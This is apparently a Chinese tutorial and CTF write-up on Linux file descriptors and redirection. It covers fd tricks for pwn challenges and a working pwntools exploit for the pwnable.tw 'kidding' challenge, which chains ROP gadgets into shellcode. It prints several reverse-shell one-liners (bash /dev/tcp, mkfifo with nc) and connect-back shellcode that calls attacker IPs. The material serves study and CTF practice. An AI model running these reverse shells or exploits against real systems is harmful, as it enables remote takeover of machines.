# 文件描述符和reverse_shell


> 昨夜西风凋碧树，独上西楼，望尽天涯路。

## 文件描述符

> linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。

当linux启动时会默认打开三个文件描述符，标准输入0，标准输出1，错误输出2。并且子进程会继承父进程的文件描述符。

我们知道在linux系统下，万物皆是文件。同样文件描述符也是一个文件，每个进程的文件描述符可在/proc/[pid]/fd下查看，也可在/proc/self/fd下查看。

![image-20210729152640571](https://gitee.com/nopnoping/img/raw/master/img/image-20210729152640571.png)

那么这些文件描述文件究竟是什么？

![image-20210729154938274](https://gitee.com/nopnoping/img/raw/master/img/image-20210729154938274.png)

利用ll查看发现，标准输入，标准输出和标准错误输出文件描述符都指向/dev/pts/5这个文件。而直接cd /dev/pts是无法成功的。那么/dev/pts/5究竟是什么？

pts和tty相似，都是中断，不过pts代表虚拟终端，不直接和物理机相连，如利用telnet，ssh连接到linux机器上获取的终端就是pts。后面的数字代表这个终端号。因此0,1,2文件描述符实质就是终端文件，终端文件是一种双向流的文件，可以输出也可以输入。

**重定向**

改变标准输入，标准输出和错误输出指向的文件，就是我们常说的重定向。

````bash
echo "echo 'inputing redirection'" > test
sh <test
ls wrong >& test
````

\>代表标准输出重定向，<代表标准输入重定向。

第一条语句将echo输出的内容重定向到了test，第二条语句将标准输入重定向为test，第三条语句将标准输出和错误输出都定向到test文件(>& 与&>等价，对于>&当重定向的不是文件描述符时，需要加空格，如果是文件描述符用&>)

## reverse shell

```  bash
bash -i >& /dev/tcp/ip/port 0>&1
```

bash是linux常用的一种shell，-i参数代表产生的shell是交互式的。

/dev/tcp/ip/port将会和目标机器（ip）的端口（port）产生tcp连接，并且该tcp连接被linux内核抽象为/dev/tcp/ip/port文件，通信中的输入输出都是通过读写该文件实现。

\>&代表将标准错误输出和错误输出重定向到/dev/tcp/ip/port文件，0>&1代表将标准输入重定向到标准输出，而标准输出此时我们已经重定向到/dev/tcp/ip/port文件，因此标准输入也将重定向到/dev/tcp/ip/port文件文件。注意这里的0>&1和0<&1等价，仅作文件描述符的复制，<和>仅当省略了符号前的描述符时不同。

通过该命令，启动后bash的0,1,2都将是/dev/tcp/ip/port文件，即当远程机器向该机器发送命令时，将会写入到/dev/tcp/ip/port文件，bash将会将远程机器发送的命令作为标准输入，进而在shell中运行，同样命令的结果将会写入/dev/tcp/ip/port文件，通过tcp协议传递给远程机器。

类似的rever shell写法。

```bash
#描述符5重定向为tcp连接文件 从中读取命令并执行返回
exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&1;done
#将/tmp/f中的内容作为sh的输入，将sh的输出返回给远程机器，将机器的输入写入/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp/f
mknod backpipe p; nc 192.168.146.129 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```

## fd trick

pwn题中，有时候会关闭标准输入，标准输出，错误输出，遇到这样的题目，我们该如何解决？下面按关闭的类型不同，讲解相应的策略。

**关闭标准输出**

获得shell后，可以利用错误输出来获得信息。如想要获得flag文件的信息，可直接运行该文件，错误信息将会暴露文件中的内容。

```bash
./flag
```

**关闭标准输出，错误输出**

获得shell后，我们可以输入命令，但是由于标准输出和错误输出的关闭无法得到结果的反馈。此时可以对标准输出做重定向。由前面的知识可知，标准输入和标准输出指向的文件实质是一样的，因此将标准输出重定向到标准输入即可显示。

```bash
cat flag >&0
```

**关闭标准输入**

此时无法输入命令，因此可以利用ORW来获得flag的值。

**关闭标准输入，标准输出，错误输出**

这是最复杂的情况，有两种方案。

1.我们知道标准输入，标准输出和错误输出都是指向/dev/pts/？，因此可以打开/dev/pts/？作为标准输出。如首先open('flag',2),打开的文件的文件标识符将会是0，在打开/dev/pts/?，文件标识符将会是1，此时可利用write来输出。

2.可以利用reverse_shell来获得flag，这里用pwntable.tw中的kidding为例来详细讲解。

## kidding

**题目描述**

32位静态程序，未开启PIE，存在栈溢出，但是关闭了标准输入，标准输出，错误输出。

**利用思路**

由于溢出的字节有限，想要实现reverse_shell需要有栈执行权限，因此首先需要打开栈的执行权限，然后创建socked文件描述符，并将其复制到文件描述符1中，之后连接attacker，最后执行execve("/bin/sh",0,0)。

**打开栈执行权限**

修改权限的函数是mprotect(void *addr, size_t len, int prot)，其第一个参数是起始地址，第二个参数是长度，第三个是权限。其中其实地址必需是页对齐的，并且len是页的整数。

想要用mprotect函数，就必须得知道stack的地址，但是stack地址是动态的，如何获得其地址？

这里要讲解以下程序初始化的知识，程序第一个运行的函数并不是main函数，而是\_start入口函数，其会调用\_\_libc\_start\_main，该函数会设置一些环境变量，全局变量等。而在这其中有3个十分关键的全局变量\_\_libc\_stack\_end，\_dl\_pagesize和\_\_stack\_prot。

> \_\_libc\_stack\_end：储存了栈顶地址。\_dl\_pagesize：储存了页的大小。\_\_stack\_prot：是栈的权限。

因此我们可以利用\_\_libc\_stack\_end作为mprotect的地址，但是mprotect要求地址是页对齐的，而\_\_libc\_stack\_end并非页对齐，此时我们可以利用\_dl\_make\_stack\_executable函数。

> \_dl\_make\_stack\_executable：只要eax为\_\_libc\_stack\_end的地址，将会调用mprotect(\_\_libc\_stack\_end & -dl_pagesize, dl_pagesize, _stack_prot)

默认情况下，_stack_prot为0x1000000,我们需要将其修改为7。

````bash
0x0804b5eb : pop dword ptr [ecx] ; ret
````

在程序中找到上面的gadget，我们可以将ecx设置为_stack_prot的地址，然后利用改gadget修改其为7。

再利用push esp;ret;将eip转到栈上。

```python
#1.stack executable
    peax_ret=0x080b8536
    pecx_ret=0x080583c9
    p_ecx_ret=0x0804b5eb
    push_esp_ret=0x080b8546
    libc_stack_end=0x080E9FC8
    stack_prot=0x080E9FEC
    dl_make_stack_executable=0x0809A080
    payload=b'a'*8+p32(ip)
    payload+=p32(pecx_ret)+p32(stack_prot)+\
             p32(p_ecx_ret)+p32(7)+\
             p32(peax_ret)+p32(libc_stack_end)+\
             p32(dl_make_stack_executable)+p32(push_esp_ret)
```

**创建socket**

利用系统调用socketcall来创建socket。其原型如下：

```c
int syscall(SYS_socketcall, int call, unsigned long *args);
```

call代表具体要调用的功能，args是该功能所需参数。call所能调用的功能即其相应的代号如下：

````c
#define SYS_SOCKET  1   /* sys_socket(2)    */
#define SYS_BIND  2   /* sys_bind(2)      */
#define SYS_CONNECT 3   /* sys_connect(2)   */
#define SYS_LISTEN  4   /* sys_listen(2)    */
#define SYS_ACCEPT  5   /* sys_accept(2)    */
#define SYS_GETSOCKNAME 6   /* sys_getsockname(2)   */
#define SYS_GETPEERNAME 7   /* sys_getpeername(2)   */
#define SYS_SOCKETPAIR  8   /* sys_socketpair(2)    */
#define SYS_SEND  9   /* sys_send(2)      */
#define SYS_RECV  10    /* sys_recv(2)      */
#define SYS_SENDTO  11    /* sys_sendto(2)    */
#define SYS_RECVFROM  12    /* sys_recvfrom(2)    */
#define SYS_SHUTDOWN  13    /* sys_shutdown(2)    */
#define SYS_SETSOCKOPT  14    /* sys_setsockopt(2)    */
#define SYS_GETSOCKOPT  15    /* sys_getsockopt(2)    */
#define SYS_SENDMSG 16    /* sys_sendmsg(2)   */
#define SYS_RECVMSG 17    /* sys_recvmsg(2)   */
#define SYS_ACCEPT4 18    /* sys_accept4(2)   */
#define SYS_RECVMMSG  19    /* sys_recvmmsg(2)    */
#define SYS_SENDMMSG  20    /* sys_sendmmsg(2)    */
````

首先我们要创建socket，即调用sys_socket，所以call的值为1。sys_socket的原型如下：

```c
int socket(int domain, int type, int protocol);
```

domain用来说明通信的范围，如IPv4，本地等。我们选择AF_INET，在Ipv4的范围内通信。

type代表通信的连接方式，如TCP，UDP等。我们选择SOCK_STREAM，即用TCP的方式通信。

protocol是指通信的附加协议。

```python
#2.reverse shell
        #2.1.socket(AF_INET(2),SOCK_STREAM(1),0)
    shellcode="push 0x1;pop ebx;push eax;push ebx;push 2;"+\
                "mov ecx,esp;mov al,0x66;int 0x80;"
```

**复制文件描述符**

由于关闭了标准输入，标准输出，错误输出，socket返回的fd为0，我们利用dup2来复制一个新的文件描述符1。

```c
int dup2(int oldfd, int newfd)
```

dup2会将旧的文件描述符oldfd，复制为一个新的文件描述符newfd，并且其指向的文件和oldfd相同。

```python
#2.2.dup2(0,1) 
    shellcode+="pop esi;pop ecx;pop ebx;mov al,0x3f;int 0x80;"
```

**连接attacker**

利用SYS_CONNECT来连接attacker主机。

```c
int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```

sockfd即socket的fd，这里我们的值为0。addrlen为sockaddr的大小。我们重点讲解以下sockaddr这个结构。

```c
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };

/* Internet address */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
```

sockaddr结构实质就是sockaddr_in，其有三个成员sin_family，sin_port，sin_addr。sinfamily代表通信域，sin_port为端口号，sin_addr为ip地址。

我们使用Ipv4通信，因此sin_family的值为 AF_INET，2两字节。

sin_port这个参数其是按照大段字节序储存，即高位地址在低位，两个字节。

sin_addr为4个字节的ip地址，小段储存。

```python
#2.3.connect(0,addr,addrlen)
    shellcode+="mov al,0x66;push ebp;push ax;push si;mov ecx,esp;"+\
            "push cs;push ecx;push ebx;mov ecx,esp;mov bl,3;int 0x80;"
```

**获得shell**

获得shell就不多做解释了

```python
#2.4.excv("/bin/sh",0,0)
    shellcode+="mov dl,al;pop ecx;mov al,0xb;push 0x68732f;push 0x6e69622f;mov ebx,esp;int 0x80;"
```

**exp**

```python
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
    sh=remote()
else:
    sh=process('./kidding')

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'

def debug(command=''):
    context.terminal = ['tmux', 'splitw', '-v']
    gdb.attach(sh,command)

def exp():
    #debug("b*0x080b8546 \nc")
    ip=u32(binary_ip('172.26.172.251'))
    port=26112
    #1.stack executable
    peax_ret=0x080b8536
    pecx_ret=0x080583c9
    p_ecx_ret=0x0804b5eb
    push_esp_ret=0x080b8546
    libc_stack_end=0x080E9FC8
    stack_prot=0x080E9FEC
    dl_make_stack_executable=0x0809A080
    payload=b'a'*8+p32(ip)
    payload+=p32(pecx_ret)+p32(stack_prot)+\
             p32(p_ecx_ret)+p32(7)+\
             p32(peax_ret)+p32(libc_stack_end)+\
             p32(dl_make_stack_executable)+p32(push_esp_ret)
    print("paylioad:{:d}".format(len(payload)))

    #2.reverse shell
        #2.1.socket(AF_INET(2),SOCK_STREAM(1),0)
    shellcode="push 0x1;pop ebx;push eax;push ebx;push 2;"+\
                "mov ecx,esp;mov al,0x66;int 0x80;"
        #2.2.dup2(0,1) 
    shellcode+="pop esi;pop ecx;pop ebx;mov al,0x3f;int 0x80;"
        #2.3.connect(0,addr,addrlen)
    shellcode+="mov al,0x66;push ebp;push ax;push si;mov ecx,esp;"+\
            "push cs;push ecx;push ebx;mov ecx,esp;mov bl,3;int 0x80;"
        #2.4.excv("/bin/sh",0,0)
    shellcode+="mov dl,al;pop ecx;mov al,0xb;push 0x68732f;push 0x6e69622f;mov ebx,esp;int 0x80;"
    print("shellcode:{:d}".format(len(asm(shellcode))))
    print("Total:{:d}".format(len(payload)+len(asm(shellcode))))
    s(payload+asm(shellcode))
    #debug()
    itr()

exp()

```

> 题目限制输入字符长度为100，但是最终写出的shellcode长度为101，但是感觉没有地方可以继续精简了，于是把题目长度改为了110来测试的脚本。（师傅们如果写出了更简短的sehllcode，望告知，感谢！

## 参考

[socketcall-Linux man page](https://man7.org/linux/man-pages/man2/socketcall.2.html)

[socket-linux-man-page](https://man7.org/linux/man-pages/man2/socket.2.html)

[connect-linux-man-page](https://man7.org/linux/man-pages/man2/connect.2.html)

[ip-linux-man-page](https://man7.org/linux/man-pages/man7/ip.7.html)

[Play with file descriptor(Ⅰ)](https://m4x.fun/post/play-with-file-descriptor-1/)

[Play with file descriptor(Ⅱ)](https://m4x.fun/post/play-with-file-descriptor-2/)

[Play with file descriptor(Ⅲ)](https://m4x.fun/post/play-with-file-descriptor-3/)

[Linux反弹shell（一）文件描述符与重定向](https://xz.aliyun.com/t/2548)

[Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)

[pwnable.tw kidding](https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/)

[kidding-wp](https://github.com/ntu-homeworks/ctf-final/blob/master/pwn/kidding/solver.py)
